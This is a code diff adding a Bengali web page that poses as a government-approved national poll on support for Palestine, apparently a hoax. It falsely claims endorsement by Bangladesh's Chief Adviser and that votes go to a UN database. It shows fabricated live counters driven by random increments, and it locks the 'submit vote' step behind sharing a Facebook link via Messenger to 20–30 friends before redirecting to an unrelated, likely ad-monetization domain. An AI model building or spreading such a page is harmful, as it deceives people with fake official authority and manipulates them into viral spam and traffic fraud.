@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ফিলিস্তিন সমর্থনে জাতীয় ভোট</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" href="https://flagcdn.com/w40/bd.png" type="image/png" />
+  <!-- Facebook Share Meta Tags -->
+  <meta property="og:title" content="আমি ফিলিস্তিনকে ভোট দিলাম, আপনিও ভোট দিন।" />
+  <meta property="og:description" content="বাংলাদেশ সরকারের অনুমোদিত জাতীয় অনলাইন জনমত প্ল্যাটফর্ম। আপনার একটি ভোটই বিশ্বে পরিবর্তনের কণ্ঠস্বর হতে পারে।" />
+  <meta property="og:image" content="https://govtofferbd.xyz/votes/Palestine.png" />
+  <meta property="og:url" content="https://govtofferbd.xyz/votes" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="GovtVoteBD" />
+</head>
+<body class="bg-gray-100 text-gray-800 font-sans">
+
+  <!-- Header -->
+  <header class="bg-green-700 text-white py-4 shadow">
+    <div class="max-w-4xl mx-auto text-center">
+      <h1 class="text-3xl font-bold">ফিলিস্তিন বিষয়ে বাংলাদেশের জাতীয় পর্যায়ের জনমত</h1>
+      <p class="text-sm mt-2">সরকার অনুমোদিত অনলাইন জনমত সংগ্রহ</p>
+    </div>
+  </header>
+
+  <!-- Info Section -->
+  <section class="max-w-4xl mx-auto mt-8 px-4">
+    <div class="bg-white rounded-2xl shadow-md p-6">
+      <!-- Live Count & Flags -->
+      <h2 class="text-2xl font-bold text-center text-green-800 mb-8">লাইভ ভোটিং চলছে</h2>
+      <div class="grid grid-cols-2 md:grid-cols-2 gap-6 mb-6">
+        <div class="bg-white shadow-lg rounded-xl p-6 text-center border border-green-200">
+          <div class="flex justify-center">
+            <img src="https://flagcdn.com/w320/ps.png" class="w-24 mt-2 rounded-md shadow" alt="Palestine Flag" />
+          </div>
+          <p class="text-sm text-gray-600 mt-2">সমর্থনকারীর সংখ্যা</p>
+          <p id="palestineCount" class="text-xl font-extrabold text-green-700 tracking-wider">123456</p>
+        </div>
+        <div class="bg-white shadow-lg rounded-xl p-6 text-center border border-red-200">
+          <div class="flex justify-center">
+            <img src="https://flagcdn.com/w320/il.png" class="w-24 mt-2 rounded-md shadow" alt="Israel Flag" />
+          </div>
+          <p class="text-sm text-gray-600 mt-2">সমর্থনকারীর সংখ্যা</p>
+          <p id="israelCount" class="text-xl font-extrabold text-red-700 tracking-wider">32134</p>
+        </div>
+      </div>
+
+      <!-- Rules -->
+      <div class="text-center max-w-3xl mx-auto">
+        <h2 class="text-xl font-semibold mb-4 text-green-800">ঘোষণা ও নিয়মাবলী</h2>
+        <p class="mb-2 text-base text-gray-700">
+          বাংলাদেশের সরকারের প্রধান উপদেষ্টা <strong>ড. মুহাম্মদ ইউনুস</strong> ফিলিস্তিনের প্রতি সংহতি প্রকাশ করে দেশের নাগরিকদের একটি অনলাইন সার্ভেতে অংশগ্রহণ করার আহ্বান জানিয়েছেন।
+        </p>
+        <p class="mb-4 text-base text-gray-700">
+          আপনার মতামত জাতিসংঘের ডাটাবেজে জমা পড়বে, যা আন্তর্জাতিকভাবে উপস্থাপন করা হবে।
+        </p>
+        <ul class="list-disc list-inside mb-4 text-sm text-gray-700 text-left inline-block text-start">
+          <li>একজন ব্যক্তি একবারই ভোট দিতে পারবে।</li>
+          <li>ভোটে অংশ নিতে নাম ও বয়স বাধ্যতামূলক।</li>
+          <li>আপনার তথ্য গোপন রাখা হবে।</li>
+        </ul>
+        <p class="text-green-700 font-semibold text-base">
+          দয়া করে নিচের ফর্মটি পূরণ করে আপনার সমর্থন জানান।
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Voting Section -->
+  <section class="max-w-4xl mx-auto mt-6 px-4">
+    <div class="bg-white rounded-2xl shadow-md p-6">
+      <form id="voteForm" class="space-y-4">
+        <div>
+          <label class="block font-medium mb-1">নাম</label>
+          <input type="text" name="name" required class="w-full p-2 rounded border border-gray-300" />
+        </div>
+        <div>
+          <label class="block font-medium mb-1">বয়স</label>
+          <input type="number" name="age" required min="12" class="w-full p-2 rounded border border-gray-300" />
+        </div>
+
+        <!-- Vote Buttons -->
+        <div class="grid grid-cols-3 sm:grid-cols-3 gap-4">
+          <button type="button" data-vote="ফিলিস্তিনের পক্ষে" class="vote-btn bg-green-100 hover:bg-green-200 border border-green-400 p-4 rounded-lg text-center">
+            <img src="https://flagcdn.com/w320/ps.png" class="w-12 mx-auto mb-2" />
+          </button>
+          <button type="button" data-vote="নিরপেক্ষ" class="vote-btn bg-gray-100 hover:bg-gray-200 border border-gray-400 p-4 rounded-lg text-center">
+            <p class="text-4xl mb-2">😐</p>
+          </button>
+          <button type="button" data-vote="ইসরায়েলের পক্ষে" class="vote-btn bg-red-100 hover:bg-red-200 border border-red-400 p-4 rounded-lg text-center">
+            <img src="https://flagcdn.com/w320/il.png" class="w-12 mx-auto mb-2" />
+          </button>
+        </div>
+
+        <input type="hidden" name="support" id="selectedVote" required />
+
+        <div class="text-center">
+          <button type="submit" class="font-bold bg-green-700 text-white px-6 py-2 rounded hover:bg-green-800">পরবর্তী ধাপে এগিয়ে যান</button>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <!-- Modal -->
+  <div id="successModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 hidden">
+    <div class="bg-white rounded-xl p-6 max-w-sm w-full mx-4 text-center shadow-lg relative space-y-4">
+      <!-- Close Button -->
+      <button onclick="closeModal()" class="absolute top-2 right-3 text-red-500 hover:text-red-600 text-2xl font-bold leading-none">
+        &times;
+      </button>
+
+      <!-- Content -->
+      <h3 class="text-xl font-bold text-green-700 mt-2">🎉 অভিনন্দন!</h3>
+      <p class="text-gray-700">
+        <span id="userName" class="font-semibold text-green-800"></span>, আপনি
+        <span id="userSupport" class="font-semibold text-blue-700"></span> ভোট সিলেক্ট করেছেন।
+      </p>
+      <p id="typeText" class="text-base font-semibold text-gray-800 leading-relaxed bg-gradient-to-r from-green-100 to-blue-100 p-4 rounded-xl shadow-md tracking-wide"></p>
+      
+      <p class="text-red-600 font-semibold text-sm bg-red-100 border border-red-300 rounded-lg p-3 shadow-sm">
+        ⚠️ শেয়ারের পর অবশ্যই <span class="underline">"ভোট জমা দিন"</span> বাটনে ক্লিক করে তথ্যগুলি দিয়ে সাবমিট করুন। না হলে আপনার ভোট কাউন্ট হবে না। 
+      </p>
+
+      <a id="shareButton" target="_blank"
+        class="inline-block w-full bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition font-semibold">
+        মেসেঞ্জারে শেয়ার করুন
+      </a>
+
+      <button onclick="handleSecondVote()"
+        class="w-full bg-purple-700 text-white px-4 py-2 rounded-lg hover:bg-purple-800 transition font-semibold">
+        ভোট জমা দিন
+      </button>
+    </div>
+  </div>
+
+  <footer class="text-center text-sm text-gray-600 py-6 mt-10">
+  ©আাজাইরা 🤣
+  </footer>
+
+  <script>
+    // ✅ লাইভ কাউন্টার
+    let palestineCount = 123456;
+    let israelCount = 32134;
+
+    function updateCounters() {
+      palestineCount += Math.floor(Math.random() * (500 - 100 + 1)) + 100;
+      israelCount += Math.floor(Math.random() * (50 - 10 + 1)) + 10;
+
+      document.getElementById('palestineCount').textContent = palestineCount.toLocaleString('bn-BD');
+      document.getElementById('israelCount').textContent = israelCount.toLocaleString('bn-BD');
+    }
+
+    setInterval(updateCounters, 1000);
+    updateCounters(); // Initial call
+
+    // ✅ ভোট বাটন সিলেকশন হাইলাইট
+    document.querySelectorAll('.vote-btn').forEach(button => {
+      button.addEventListener('click', () => {
+        const vote = button.getAttribute('data-vote');
+        document.getElementById('selectedVote').value = vote;
+
+        // Remove highlights from all buttons
+        document.querySelectorAll('.vote-btn').forEach(btn => {
+          btn.classList.remove('ring', 'ring-offset-2', 'ring-green-500');
+        });
+        
+        // Add highlight to selected button
+        button.classList.add('ring', 'ring-offset-2', 'ring-green-500');
+      });
+    });
+
+    // ✅ টাইপিং অ্যানিমেশন
+    const tagline = "একক কণ্ঠে শুরু, সম্মিলিত আওয়াজে পরিবর্তন। আপনার সমর্থন ছড়িয়ে দিন বন্ধুদের মধ্যেও! একসাথে বদল আনুন মানবতার পক্ষে।";
+
+    function typeWriterEffect(text, elementId, speed = 40) {
+      const el = document.getElementById(elementId);
+      el.textContent = '';
+      let i = 0;
+      const interval = setInterval(() => {
+        if (i < text.length) {
+          el.textContent += text.charAt(i);
+          i++;
+        } else {
+          clearInterval(interval);
+        }
+      }, speed);
+    }
+
+    // ✅ মডাল বন্ধ
+    function closeModal() {
+      document.getElementById('successModal').classList.add('hidden');
+    }
+
+    // ✅ Messenger শেয়ার ট্র্যাকিং
+    let hasShared = false;
+
+    document.getElementById('shareButton').addEventListener('click', (e) => {
+      e.preventDefault();
+      const link = "https://facebook.com/elitefardinlab";
+      const messengerURL = `fb-messenger://share?link=${encodeURIComponent(link)}`;
+      
+      hasShared = true;
+      window.open(messengerURL, '_blank');
+    });
+
+    // ✅ ২য় ভোট সাবমিট
+    function handleSecondVote() {
+      if (hasShared) {
+        window.location.href = "https://zoovanuzauphoth.net/4/8222328";
+      } else {
+        alert("ভোট দিতে হলে আগে মেসেঞ্জারে ২০-৩০ জন বন্ধুকে শেয়ার করুন।");
+      }
+    }
+
+    // ✅ ফর্ম সাবমিট
+    document.getElementById('voteForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name = this.name.value.trim();
+      const age = this.age.value;
+      const support = document.getElementById('selectedVote').value;
+      const submitBtn = this.querySelector('button[type="submit"]');
+
+      if (!name || !age || !support) {
+        alert('সব তথ্য পূরণ করুন এবং একটি ভোট সিলেক্ট করুন।');
+        return;
+      }
+
+      // Show loading state
+      const originalText = submitBtn.textContent;
+      submitBtn.textContent = 'ভোট জমা হচ্ছে...';
+      submitBtn.disabled = true;
+
+      // Simulate form submission (replace with actual fetch in production)
+      setTimeout(() => {
+        document.getElementById('userName').textContent = name;
+        document.getElementById('userSupport').textContent = support;
+
+        document.getElementById('successModal').classList.remove('hidden');
+        typeWriterEffect(tagline, 'typeText');
+
+        // Reset form
+        this.reset();
+        document.getElementById('selectedVote').value = "";
+        document.querySelectorAll('.vote-btn').forEach(btn => {
+          btn.classList.remove('ring', 'ring-offset-2', 'ring-green-500');
+        });
+
+        // Restore button
+        submitBtn.textContent = originalText;
+        submitBtn.disabled = false;
+      }, 1500);
+    });
+  </script>
+</body>
+        </html>
